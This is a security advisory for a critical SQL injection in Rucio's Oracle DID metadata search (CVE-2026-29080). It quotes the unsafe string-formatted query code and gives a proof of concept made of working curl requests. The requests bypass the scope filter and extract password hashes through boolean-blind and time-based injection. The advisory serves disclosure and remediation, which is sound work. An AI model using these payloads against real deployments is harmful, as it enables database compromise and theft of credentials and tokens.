# [C] Rucio has SQL Injection in FilterEngine Oracle JSON Path via DID Search API

## Summary
Severity: Critical
Advisory: GHSA-vjr5-c9qv-hgm3
CVE: CVE-2026-29080
CWE: CWE-89
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-vjr5-c9qv-hgm3
Type: github-advisory

## Affected
- PyPI: `rucio` — affected >=1.27.0 <35.8.5
- PyPI: `rucio` — affected >=36.0.0 <38.5.5
- PyPI: `rucio` — affected >=39.0.0 <39.4.2
- PyPI: `rucio` — affected >=40.0.0 <40.1.1

## Details
### Summary

A SQL injection vulnerability in the Oracle path of `FilterEngine.create_sqla_query` allows any authenticated Rucio user to execute arbitrary SQL against the backend database through the DID search endpoint (`GET /dids/<scope>/dids/search`). Attacker-controlled filter keys and values are interpolated directly into `sqlalchemy.text` via Python `str.format`, completely bypassing parameterization. This enables full database compromise including extraction of authentication tokens, password hashes, and all managed data identifiers. The vulnerability is affecting deployments using the default metadata plugin configuration `json_meta` with Oracle database backends.

---

### Details

The vulnerability exists in `lib/rucio/core/did_meta_plugins/filter_engine.py` within the `create_sqla_query()` method. When the database dialect is Oracle, filter expressions for JSON metadata columns are constructed using `text()` with Python string formatting:

**filter_engine.py:552** (string equality — default branch):
```python
expression = text("json_exists({},'$?(@.{} {} \"{}\")')".format(
    json_column.key, key, ORACLE_OP_MAP[oper], value))
```

**filter_engine.py:548** (boolean branch):
```python
expression = text("json_exists({},'$?(@.{}.boolean() {} \"{}\")')".format(
    json_column.key, key, ORACLE_OP_MAP[oper], value))
```

**filter_engine.py:550** (numeric branch — value unquoted):
```python
expression = text("json_exists({},'$?(@.{} {} {})')".format(
    json_column.key, key, ORACLE_OP_MAP[oper], value))
```

**filter_engine.py:542** (wildcard/LIKE branch):
```python
expression = text("json_exists({},'$?(@.{} like \"{}\")')".format(
    json_column.key, key, value.replace('*', '%')))
```

Both `key` and `value` are attacker-controlled strings derived from HTTP query parameters. The `text()` function creates a raw SQL fragment — it does **not** escape or parameterize its contents.

#### Why no existing defense blocks this

The complete data flow from HTTP request to SQL execution passes through 7 layers with no effective sanitization:

1. **HTTP input** (`dids.py:265-274`): Filter keys and values are accepted from query parameters via `ast.literal_eval()` (which accepts arbitrary Python string literals) or directly from individual query argument names/values.

2. **Plugin routing** (`did_meta_plugins/__init__.py:227-248`): Each filter key is checked via `manages_key()`. For keys that are NOT columns of the `DataIdentifier` model (e.g., custom metadata keys like `custom_key`), `did_column_meta.manages_key()` returns `False`, and the request falls through to `json_meta.manages_key()`, which returns `True` for any key on Oracle ≥12 (`json_meta.py:234` → `json_implemented()` → `True`).

3. **FilterEngine initialization** (`filter_engine.py:260`): The `json_meta` plugin instantiates `FilterEngine` with `strict_coerce=False` (`json_meta.py:178`). In `_coerce_filter_word_to_model_attribute()` (line 116), when the key is not an attribute of `models.DidMeta` and `strict=False`, the raw string is returned without validation.

4. **Value typecasting** (`filter_engine.py:275-297`): `_try_typecast_string()` attempts to parse the value as a boolean, datetime, or number. SQL injection strings fail all these parsers and are returned unchanged as strings.

5. **Sanity checks** (`filter_engine.py:149-190`): `_sanity_check_translated_filters()` only validates `did_type`, `name`, `length`, wildcard operators, `created_at` format, and duplicates. It does **not** validate arbitrary key names or values for SQL-unsafe characters.

6. **SQL construction** (`filter_engine.py:536-554`): On Oracle, the unsanitized key and value strings are interpolated directly into `text()` via `.format()`.

7. **SQL execution** (`json_meta.py:199,212`): The resulting `Select` statement containing the injected `text()` clause is executed via `session.execute(stmt)`.

#### Note on the non-Oracle path

The non-Oracle branch of `create_sqla_query()` (lines 555-579) uses SQLAlchemy's `json_column[key].as_string()` accessor, which compiles the key as a bind parameter (`%(meta_1)s`). This path is **not vulnerable**. The vulnerability is specific to the Oracle dialect branch that uses `text()` with `.format()`.

---

### PoC

**Prerequisites:**
- A Rucio instance using Oracle as the database backend
- The default metadata plugin configuration (`json_meta` as custom plugin — this is the default)
- Any valid Rucio authentication token (obtainable via userpass, x509, OIDC, SAML, SSH, or GSS)

**Note on injection technique:** The `text()` fragment is inserted into a SQLAlchemy query that includes additional bind-parameter conditions (e.g., `AND system.did_meta.scope = :scope_1`). SQL comment (`--`) cannot be used to discard the trailing syntax because cx_Oracle validates that all registered bind parameters exist in the SQL text, raising `ORA-01036` if they are commented out. Instead, the injection consumes the template's trailing characters (`")')`) by opening a dummy `json_exists()` call that the trailing characters close naturally, preserving all bind parameters.

The format template suffix after the injected value is exactly `")')` — four characters: closing double-quote, closing predicate paren, closing path string single-quote, closing `json_exists()` paren. The payload opens a new `json_exists(meta,'$?(@.a == "b` which the suffix closes as `json_exists(meta,'$?(@.a == "b")')`.

#### 1. Obtain an authentication token

```bash
TOKEN=$(curl -s -k \
  -H 'X-Rucio-Account: testuser' \
  -H 'X-Rucio-Username: testuser' \
  -H 'X-Rucio-Password: testpass' \
  'https://rucio.example.org/auth/userpass' \
  -D - 2>/dev/null | grep -i 'x-rucio-auth-token' | awk '{print $2}' | tr -d '\r')
```

#### 2. Boolean-based scope bypass

```bash
curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  'https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x%22%27)%20OR%201%3D1%20OR%20json_exists(meta%2C%27%24%3F(%40.a%20%3D%3D%20%22b'
```

**URL-decoded filter value:** `x")') OR 1=1 OR json_exists(meta,'$?(@.a == "b`

**Generated SQL inside `text()`:**
```sql
json_exists(meta,'$?(@.custom_key == "x")') OR 1=1 OR json_exists(meta,'$?(@.a == "b")')
```

**Full WHERE clause as compiled by SQLAlchemy:**
```sql
WHERE json_exists(meta,'$?(@.custom_key == "x")') OR 1=1 OR json_exists(meta,'$?(@.a == "b")') AND system.did_meta.scope = :scope_1
```

**Why this bypasses the scope filter:** SQL operator precedence — `AND` binds tighter than `OR`. Oracle parses this as:
```sql
WHERE
  json_exists(...)                                        -- disjunct 1
  OR 1=1                                                  -- disjunct 2 (always TRUE)
  OR (json_exists(...) AND system.did_meta.scope = :scope_1)  -- disjunct 3
```

Because `1=1` is unconditionally true, the entire WHERE clause evaluates to TRUE for every row regardless of scope. All bind parameters (`:scope_1`) remain intact in the SQL — no `ORA-01036`.

**Expected result:** All rows from `did_meta` are returned regardless of scope.

#### 3. Boolean-based blind injection (data extraction)

```bash
curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  'https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x%22%27)%20OR%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20identities%20WHERE%20ROWNUM%3D1)%2C1%2C1)%3D%27a%27%20THEN%201%20ELSE%200%20END%20FROM%20dual)%3D1%20OR%20json_exists(meta%2C%27%24%3F(%40.a%20%3D%3D%20%22b'
```

**URL-decoded filter value:**
```
x")') OR (SELECT CASE WHEN SUBSTR((SELECT password FROM identities WHERE ROWNUM=1),1,1)='a' THEN 1 ELSE 0 END FROM dual)=1 OR json_exists(meta,'$?(@.a == "b
```

**Generated SQL inside `text()`:**
```sql
json_exists(meta,'$?(@.custom_key == "x")') OR (SELECT CASE WHEN SUBSTR((SELECT password FROM identities WHERE ROWNUM=1),1,1)='a' THEN 1 ELSE 0 END FROM dual)=1 OR json_exists(meta,'$?(@.a == "b")')
```

**Expected result:**
- If the first character of the first password hash is `'a'`: rows are returned (subquery returns 1, `1=1` is true, OR makes WHERE true)
- Otherwise: no rows from the subquery disjunct (but the dummy `json_exists` AND scope disjunct may still match scoped rows — the attacker distinguishes by response row count)
- Repeat for each character position and value to extract the full hash

#### 4. Time-based blind injection (alternative extraction)

```bash
curl -s -k -o /dev/null -w "%{time_total}" \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  'https://rucio.example.org/dids/user.testuser/dids/search?custom_key=x%22%27)%20OR%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20identities%20WHERE%20ROWNUM%3D1)%2C1%2C1)%3D%27a%27%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE(%27x%27%2C5)%20ELSE%200%20END%20FROM%20dual)%3D5%20OR%20json_exists(meta%2C%27%24%3F(%40.a%20%3D%3D%20%22b'
```

**URL-decoded filter value:**
```
x")') OR (SELECT CASE WHEN SUBSTR((SELECT password FROM identities WHERE ROWNUM=1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END FROM dual)=5 OR json_exists(meta,'$?(@.a == "b
```

**Expected result:**
- If condition is true: response delayed by ~5 seconds
- If condition is false: immediate response
- More reliable extraction channel than boolean-based when row counts are ambiguous

#### 5. Alternative entry via `filters` query parameter

```bash
curl -s -k \
  -H "X-Rucio-Auth-Token: $TOKEN" \
  -H "Accept: application/x-json-stream" \
  'https://rucio.example.org/dids/user.testuser/dids/search?filters=%5B%7B%22custom_key%22%3A%20%22x%5C%22%27)%20OR%201%3D1%20OR%20json_exists(meta%2C%27%24%3F(%40.a%20%3D%3D%20%5C%22b%22%7D%5D'
```

**URL-decoded:** `filters=[{"custom_key": "x\"') OR 1=1 OR json_exists(meta,'$?(@.a == \"b"}]`

---

### Impact

**Vulnerability type:** SQL Injection (CWE-89)

**Who is impacted:**

- **All Oracle-based Rucio deployments** using the default metadata plugin configuration (`json_meta`).
- ***Not affected*** are PostgreSQL/MySQL deployments using the default `json_meta` plugin (SQLAlchemy parameterizes the JSON path operations via bind parameters on non-Oracle dialects).

**What an attacker can do:**

- **Full database read access:** Extract any table including `identities` (password hashes and salts), `tokens` (active authentication sessions), `accounts` (user enumeration), `rse_settings` (storage endpoint credentials), and `rules` (data management policies).
- **Password hash extraction:** Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.
- **Authentication token theft:** Active bearer tokens can be extracted and used for immediate session hijacking.
- **Data modification:** Oracle PL/SQL enables `INSERT`/`UPDATE`/`DELETE` operations via DML within subqueries and PL/SQL blocks.
- **Potential remote code execution:** Via Oracle's `UTL_HTTP`, `DBMS_SCHEDULER`, or Java stored procedures if the database user has elevated privileges.

**Required attacker privileges:** Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The `GET /dids/<scope>/dids/search` endpoint is available to all authenticated users.

## References
- https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3
- https://nvd.nist.gov/vuln/detail/CVE-2026-29080
- https://github.com/advisories/GHSA-vjr5-c9qv-hgm3
- https://github.com/pypa/advisory-database/tree/main/vulns/rucio/PYSEC-2026-528.yaml
- https://github.com/rucio/rucio
- https://pypi.org/project/rucio
